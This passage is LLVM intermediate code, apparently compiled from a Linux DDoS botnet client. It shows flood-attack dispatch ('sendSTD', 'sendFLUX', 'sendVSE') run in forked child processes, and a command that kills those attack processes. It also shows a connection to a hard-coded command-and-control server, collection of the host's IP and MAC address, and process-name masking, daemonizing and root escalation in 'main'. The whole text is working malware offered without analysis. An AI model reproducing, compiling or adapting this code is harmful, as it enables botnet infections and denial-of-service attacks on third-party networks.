  %467 = load i8*, i8** %29, align 8
  %468 = icmp ne i8* %467, null
  br i1 %468, label %469, label %474

; <label>:469:                                    ; preds = %466
  %470 = load i8*, i8** %29, align 8
  %471 = load i32, i32* %27, align 4
  %472 = load i32, i32* %28, align 4
  call void @sendSTD(i8* %470, i32 %471, i32 %472)
  %473 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %473, i8** %29, align 8
  br label %466

; <label>:474:                                    ; preds = %466
  br label %479

; <label>:475:                                    ; preds = %448
  %476 = load i8*, i8** %26, align 8
  %477 = load i32, i32* %27, align 4
  %478 = load i32, i32* %28, align 4
  call void @sendSTD(i8* %476, i32 %477, i32 %478)
  br label %479

; <label>:479:                                    ; preds = %475, %474
  br label %751

; <label>:480:                                    ; preds = %426
  %481 = load i8**, i8*** %4, align 8
  %482 = getelementptr inbounds i8*, i8** %481, i64 0
  %483 = load i8*, i8** %482, align 8
  %484 = call i32 @strcmp(i8* %483, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.106, i32 0, i32 0)) #10
  %485 = icmp ne i32 %484, 0
  br i1 %485, label %560, label %486

; <label>:486:                                    ; preds = %480
  %487 = load i32, i32* %3, align 4
  %488 = icmp slt i32 %487, 6
  br i1 %488, label %489, label %490

; <label>:489:                                    ; preds = %486
  br label %751

; <label>:490:                                    ; preds = %486
  %491 = load i8**, i8*** %4, align 8
  %492 = getelementptr inbounds i8*, i8** %491, i64 1
  %493 = load i8*, i8** %492, align 8
  store i8* %493, i8** %30, align 8
  %494 = load i8**, i8*** %4, align 8
  %495 = getelementptr inbounds i8*, i8** %494, i64 2
  %496 = load i8*, i8** %495, align 8
  %497 = call i32 @atoi(i8* %496) #10
  store i32 %497, i32* %31, align 4
  %498 = load i8**, i8*** %4, align 8
  %499 = getelementptr inbounds i8*, i8** %498, i64 3
  %500 = load i8*, i8** %499, align 8
  %501 = call i32 @atoi(i8* %500) #10
  store i32 %501, i32* %32, align 4
  %502 = load i8**, i8*** %4, align 8
  %503 = getelementptr inbounds i8*, i8** %502, i64 4
  %504 = load i8*, i8** %503, align 8
  %505 = call i32 @atoi(i8* %504) #10
  store i32 %505, i32* %33, align 4
  %506 = load i32, i32* %3, align 4
  %507 = icmp eq i32 %506, 7
  br i1 %507, label %508, label %513

; <label>:508:                                    ; preds = %490
  %509 = load i8**, i8*** %4, align 8
  %510 = getelementptr inbounds i8*, i8** %509, i64 6
  %511 = load i8*, i8** %510, align 8
  %512 = call i32 @atoi(i8* %511) #10
  br label %514

; <label>:513:                                    ; preds = %490
  br label %514

; <label>:514:                                    ; preds = %513, %508
  %515 = phi i32 [ %512, %508 ], [ 10, %513 ]
  store i32 %515, i32* %34, align 4
  %516 = load i32, i32* %3, align 4
  %517 = icmp sgt i32 %516, 5
  br i1 %517, label %518, label %523

; <label>:518:                                    ; preds = %514
  %519 = load i8**, i8*** %4, align 8
  %520 = getelementptr inbounds i8*, i8** %519, i64 5
  %521 = load i8*, i8** %520, align 8
  %522 = call i32 @atoi(i8* %521) #10
  br label %524

; <label>:523:                                    ; preds = %514
  br label %524

; <label>:524:                                    ; preds = %523, %518
  %525 = phi i32 [ %522, %518 ], [ 0, %523 ]
  store i32 %525, i32* %35, align 4
  %526 = load i8*, i8** %30, align 8
  %527 = call i8* @strstr(i8* %526, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %528 = icmp ne i8* %527, null
  br i1 %528, label %529, label %548

; <label>:529:                                    ; preds = %524
  %530 = load i8*, i8** %30, align 8
  %531 = call i8* @strtok(i8* %530, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %531, i8** %36, align 8
  br label %532

; <label>:532:                                    ; preds = %545, %529
  %533 = load i8*, i8** %36, align 8
  %534 = icmp ne i8* %533, null
  br i1 %534, label %535, label %547

; <label>:535:                                    ; preds = %532
  %536 = call i32 @listFork()
  %537 = icmp ne i32 %536, 0
  br i1 %537, label %545, label %538

; <label>:538:                                    ; preds = %535
  %539 = load i8*, i8** %36, align 8
  %540 = load i32, i32* %31, align 4
  %541 = load i32, i32* %32, align 4
  %542 = load i32, i32* %33, align 4
  %543 = load i32, i32* %35, align 4
  %544 = load i32, i32* %34, align 4
  call void @sendFLUX(i8* %539, i32 %540, i32 %541, i32 %542, i32 %543, i32 %544)
  call void @_exit(i32 0) #12
  unreachable

; <label>:545:                                    ; preds = %535
  %546 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %546, i8** %36, align 8
  br label %532

; <label>:547:                                    ; preds = %532
  br label %559

; <label>:548:                                    ; preds = %524
  %549 = call i32 @listFork()
  %550 = icmp ne i32 %549, 0
  br i1 %550, label %551, label %552

; <label>:551:                                    ; preds = %548
  br label %751

; <label>:552:                                    ; preds = %548
  %553 = load i8*, i8** %30, align 8
  %554 = load i32, i32* %31, align 4
  %555 = load i32, i32* %32, align 4
  %556 = load i32, i32* %33, align 4
  %557 = load i32, i32* %35, align 4
  %558 = load i32, i32* %34, align 4
  call void @sendFLUX(i8* %553, i32 %554, i32 %555, i32 %556, i32 %557, i32 %558)
  call void @_exit(i32 0) #12
  unreachable

; <label>:559:                                    ; preds = %547
  br label %560

; <label>:560:                                    ; preds = %559, %480
  %561 = load i8**, i8*** %4, align 8
  %562 = getelementptr inbounds i8*, i8** %561, i64 0
  %563 = load i8*, i8** %562, align 8
  %564 = call i32 @strcmp(i8* %563, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.107, i32 0, i32 0)) #10
  %565 = icmp ne i32 %564, 0
  br i1 %565, label %709, label %566

; <label>:566:                                    ; preds = %560
  %567 = load i32, i32* %3, align 4
  %568 = icmp slt i32 %567, 6
  br i1 %568, label %620, label %569

; <label>:569:                                    ; preds = %566
  %570 = load i8**, i8*** %4, align 8
  %571 = getelementptr inbounds i8*, i8** %570, i64 3
  %572 = load i8*, i8** %571, align 8
  %573 = call i32 @atoi(i8* %572) #10
  %574 = icmp eq i32 %573, -1
  br i1 %574, label %620, label %575

; <label>:575:                                    ; preds = %569
  %576 = load i8**, i8*** %4, align 8
  %577 = getelementptr inbounds i8*, i8** %576, i64 2
  %578 = load i8*, i8** %577, align 8
  %579 = call i32 @atoi(i8* %578) #10
  %580 = icmp eq i32 %579, -1
  br i1 %580, label %620, label %581

; <label>:581:                                    ; preds = %575
  %582 = load i8**, i8*** %4, align 8
  %583 = getelementptr inbounds i8*, i8** %582, i64 4
  %584 = load i8*, i8** %583, align 8
  %585 = call i32 @atoi(i8* %584) #10
  %586 = icmp eq i32 %585, -1
  br i1 %586, label %620, label %587

; <label>:587:                                    ; preds = %581
  %588 = load i8**, i8*** %4, align 8
  %589 = getelementptr inbounds i8*, i8** %588, i64 5
  %590 = load i8*, i8** %589, align 8
  %591 = call i32 @atoi(i8* %590) #10
  %592 = icmp eq i32 %591, -1
  br i1 %592, label %620, label %593

; <label>:593:                                    ; preds = %587
  %594 = load i8**, i8*** %4, align 8
  %595 = getelementptr inbounds i8*, i8** %594, i64 5
  %596 = load i8*, i8** %595, align 8
  %597 = call i32 @atoi(i8* %596) #10
  %598 = icmp sgt i32 %597, 65536
  br i1 %598, label %620, label %599

; <label>:599:                                    ; preds = %593
  %600 = load i8**, i8*** %4, align 8
  %601 = getelementptr inbounds i8*, i8** %600, i64 5
  %602 = load i8*, i8** %601, align 8
  %603 = call i32 @atoi(i8* %602) #10
  %604 = icmp sgt i32 %603, 65500
  br i1 %604, label %620, label %605

; <label>:605:                                    ; preds = %599
  %606 = load i8**, i8*** %4, align 8
  %607 = getelementptr inbounds i8*, i8** %606, i64 4
  %608 = load i8*, i8** %607, align 8
  %609 = call i32 @atoi(i8* %608) #10
  %610 = icmp sgt i32 %609, 32
  br i1 %610, label %620, label %611

; <label>:611:                                    ; preds = %605
  %612 = load i32, i32* %3, align 4
  %613 = icmp eq i32 %612, 7
  br i1 %613, label %614, label %621

; <label>:614:                                    ; preds = %611
  %615 = load i8**, i8*** %4, align 8
  %616 = getelementptr inbounds i8*, i8** %615, i64 6
  %617 = load i8*, i8** %616, align 8
  %618 = call i32 @atoi(i8* %617) #10
  %619 = icmp slt i32 %618, 1
  br i1 %619, label %620, label %621

; <label>:620:                                    ; preds = %614, %605, %599, %593, %587, %581, %575, %569, %566
  br label %751

; <label>:621:                                    ; preds = %614, %611
  %622 = load i8**, i8*** %4, align 8
  %623 = getelementptr inbounds i8*, i8** %622, i64 1
  %624 = load i8*, i8** %623, align 8
  store i8* %624, i8** %37, align 8
  %625 = load i8**, i8*** %4, align 8
  %626 = getelementptr inbounds i8*, i8** %625, i64 2
  %627 = load i8*, i8** %626, align 8
  %628 = call i32 @atoi(i8* %627) #10
  store i32 %628, i32* %38, align 4
  %629 = load i8**, i8*** %4, align 8
  %630 = getelementptr inbounds i8*, i8** %629, i64 3
  %631 = load i8*, i8** %630, align 8
  %632 = call i32 @atoi(i8* %631) #10
  store i32 %632, i32* %39, align 4
  %633 = load i8**, i8*** %4, align 8
  %634 = getelementptr inbounds i8*, i8** %633, i64 4
  %635 = load i8*, i8** %634, align 8
  %636 = call i32 @atoi(i8* %635) #10
  store i32 %636, i32* %40, align 4
  %637 = load i8**, i8*** %4, align 8
  %638 = getelementptr inbounds i8*, i8** %637, i64 5
  %639 = load i8*, i8** %638, align 8
  %640 = call i32 @atoi(i8* %639) #10
  store i32 %640, i32* %41, align 4
  %641 = load i32, i32* %3, align 4
  %642 = icmp sgt i32 %641, 6
  br i1 %642, label %643, label %648

; <label>:643:                                    ; preds = %621
  %644 = load i8**, i8*** %4, align 8
  %645 = getelementptr inbounds i8*, i8** %644, i64 6
  %646 = load i8*, i8** %645, align 8
  %647 = call i32 @atoi(i8* %646) #10
  br label %649

; <label>:648:                                    ; preds = %621
  br label %649

; <label>:649:                                    ; preds = %648, %643
  %650 = phi i32 [ %647, %643 ], [ 1000, %648 ]
  store i32 %650, i32* %42, align 4
  %651 = load i32, i32* %3, align 4
  %652 = icmp sgt i32 %651, 7
  br i1 %652, label %653, label %658

; <label>:653:                                    ; preds = %649
  %654 = load i8**, i8*** %4, align 8
  %655 = getelementptr inbounds i8*, i8** %654, i64 7
  %656 = load i8*, i8** %655, align 8
  %657 = call i32 @atoi(i8* %656) #10
  br label %659

; <label>:658:                                    ; preds = %649
  br label %659

; <label>:659:                                    ; preds = %658, %653
  %660 = phi i32 [ %657, %653 ], [ 1000000, %658 ]
  store i32 %660, i32* %43, align 4
  %661 = load i32, i32* %3, align 4
  %662 = icmp sgt i32 %661, 8
  br i1 %662, label %663, label %668

; <label>:663:                                    ; preds = %659
  %664 = load i8**, i8*** %4, align 8
  %665 = getelementptr inbounds i8*, i8** %664, i64 8
  %666 = load i8*, i8** %665, align 8
  %667 = call i32 @atoi(i8* %666) #10
  br label %669

; <label>:668:                                    ; preds = %659
  br label %669

; <label>:669:                                    ; preds = %668, %663
  %670 = phi i32 [ %667, %663 ], [ 0, %668 ]
  store i32 %670, i32* %44, align 4
  %671 = load i8*, i8** %37, align 8
  %672 = call i8* @strstr(i8* %671, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %673 = icmp ne i8* %672, null
  br i1 %673, label %674, label %695

; <label>:674:                                    ; preds = %669
  %675 = load i8*, i8** %37, align 8
  %676 = call i8* @strtok(i8* %675, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %676, i8** %45, align 8
  br label %677

; <label>:677:                                    ; preds = %692, %674
  %678 = load i8*, i8** %45, align 8
  %679 = icmp ne i8* %678, null
  br i1 %679, label %680, label %694

; <label>:680:                                    ; preds = %677
  %681 = call i32 @listFork()
  %682 = icmp ne i32 %681, 0
  br i1 %682, label %692, label %683

; <label>:683:                                    ; preds = %680
  %684 = load i8*, i8** %45, align 8
  %685 = load i32, i32* %38, align 4
  %686 = load i32, i32* %39, align 4
  %687 = load i32, i32* %40, align 4
  %688 = load i32, i32* %41, align 4
  %689 = load i32, i32* %42, align 4
  %690 = load i32, i32* %43, align 4
  %691 = load i32, i32* %44, align 4
  call void @sendVSE(i8* %684, i32 %685, i32 %686, i32 %687, i32 %688, i32 %689, i32 %690, i32 %691)
  call void @_exit(i32 0) #12
  unreachable

; <label>:692:                                    ; preds = %680
  %693 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %693, i8** %45, align 8
  br label %677

; <label>:694:                                    ; preds = %677
  br label %708

; <label>:695:                                    ; preds = %669
  %696 = call i32 @listFork()
  %697 = icmp ne i32 %696, 0
  br i1 %697, label %707, label %698

; <label>:698:                                    ; preds = %695
  %699 = load i8*, i8** %37, align 8
  %700 = load i32, i32* %38, align 4
  %701 = load i32, i32* %39, align 4
  %702 = load i32, i32* %40, align 4
  %703 = load i32, i32* %41, align 4
  %704 = load i32, i32* %42, align 4
  %705 = load i32, i32* %43, align 4
  %706 = load i32, i32* %44, align 4
  call void @sendVSE(i8* %699, i32 %700, i32 %701, i32 %702, i32 %703, i32 %704, i32 %705, i32 %706)
  call void @_exit(i32 0) #12
  unreachable

; <label>:707:                                    ; preds = %695
  br label %708

; <label>:708:                                    ; preds = %707, %694
  br label %751

; <label>:709:                                    ; preds = %560
  %710 = load i8**, i8*** %4, align 8
  %711 = getelementptr inbounds i8*, i8** %710, i64 0
  %712 = load i8*, i8** %711, align 8
  %713 = call i32 @strcmp(i8* %712, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.108, i32 0, i32 0)) #10
  %714 = icmp ne i32 %713, 0
  br i1 %714, label %751, label %715

; <label>:715:                                    ; preds = %709
  store i32 0, i32* %46, align 4
  store i64 0, i64* %47, align 8
  br label %716

; <label>:716:                                    ; preds = %742, %715
  %717 = load i64, i64* %47, align 8
  %718 = load i64, i64* @numpids, align 8
  %719 = icmp ult i64 %717, %718
  br i1 %719, label %720, label %745

; <label>:720:                                    ; preds = %716
  %721 = load i32*, i32** @pids, align 8
  %722 = load i64, i64* %47, align 8
  %723 = getelementptr inbounds i32, i32* %721, i64 %722
  %724 = load i32, i32* %723, align 4
  %725 = icmp ne i32 %724, 0
  br i1 %725, label %726, label %741

; <label>:726:                                    ; preds = %720
  %727 = load i32*, i32** @pids, align 8
  %728 = load i64, i64* %47, align 8
  %729 = getelementptr inbounds i32, i32* %727, i64 %728
  %730 = load i32, i32* %729, align 4
  %731 = call i32 @getpid() #2
  %732 = icmp ne i32 %730, %731
  br i1 %732, label %733, label %741

; <label>:733:                                    ; preds = %726
  %734 = load i32*, i32** @pids, align 8
  %735 = load i64, i64* %47, align 8
  %736 = getelementptr inbounds i32, i32* %734, i64 %735
  %737 = load i32, i32* %736, align 4
  %738 = call i32 @kill(i32 %737, i32 9) #2
  %739 = load i32, i32* %46, align 4
  %740 = add nsw i32 %739, 1
  store i32 %740, i32* %46, align 4
  br label %741

; <label>:741:                                    ; preds = %733, %726, %720
  br label %742

; <label>:742:                                    ; preds = %741
  %743 = load i64, i64* %47, align 8
  %744 = add i64 %743, 1
  store i64 %744, i64* %47, align 8
  br label %716

; <label>:745:                                    ; preds = %716
  %746 = load i32, i32* %46, align 4
  %747 = icmp sgt i32 %746, 0
  br i1 %747, label %748, label %749

; <label>:748:                                    ; preds = %745
  br label %750

; <label>:749:                                    ; preds = %745
  br label %750

; <label>:750:                                    ; preds = %749, %748
  br label %751

; <label>:751:                                    ; preds = %750, %709, %708, %620, %551, %489, %479, %447, %402, %398, %376, %344, %322, %247, %195, %107
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @OreoServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #2
  store i32 49182, i32* %3, align 4
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strchr(i8* %26, i32 58) #10
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %19
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %31 = call i8* @strchr(i8* %30, i32 58) #10
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #10
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #10
  store i8 0, i8* %35, align 1
  br label %36

; <label>:36:                                     ; preds = %29, %19
  %37 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 %38, i8* %39, i32 %40, i32 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

; <label>:44:                                     ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %101

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.109, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %101

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %101

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.110, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.111, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %98

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.5* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #2
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %97

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.6* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %10, align 4
  br label %79

; <label>:97:                                     ; preds = %79
  br label %98

; <label>:98:                                     ; preds = %97, %65
  %99 = load i32, i32* %2, align 4
  %100 = call i32 @close(i32 %99)
  br label %101

; <label>:101:                                    ; preds = %98, %36, %29, %15
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #10
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i32 0, i32 0), i64 %29) #2
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %37 = call i32 @getpid() #2
  %38 = xor i32 %36, %37
  call void @srand(i32 %38) #2
  %39 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %40 = call i32 @getpid() #2
  %41 = xor i32 %39, %40
  call void @init_rand(i32 %41)
  %42 = call i32 @fork() #2
  store i32 %42, i32* %7, align 4
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %47

; <label>:44:                                     ; preds = %2
  %45 = load i32, i32* %7, align 4
  %46 = call i32 @waitpid(i32 %45, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:47:                                     ; preds = %2
  %48 = load i32, i32* %7, align 4
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %61, label %50

; <label>:50:                                     ; preds = %47
  %51 = call i32 @fork() #2
  store i32 %51, i32* %8, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %50
  call void @exit(i32 0) #14
  unreachable

; <label>:54:                                     ; preds = %50
  %55 = load i32, i32* %8, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %58, label %57

; <label>:57:                                     ; preds = %54
  br label %59

; <label>:58:                                     ; preds = %54
  br label %59

; <label>:59:                                     ; preds = %58, %57
  br label %60

; <label>:60:                                     ; preds = %59
  br label %62

; <label>:61:                                     ; preds = %47
  br label %62

; <label>:62:                                     ; preds = %61, %60
  br label %63

; <label>:63:                                     ; preds = %62
  %64 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.112, i32 0, i32 0)) #2
  %65 = call i32 @setuid(i32 0) #2
  %66 = call i32 @seteuid(i32 0) #2
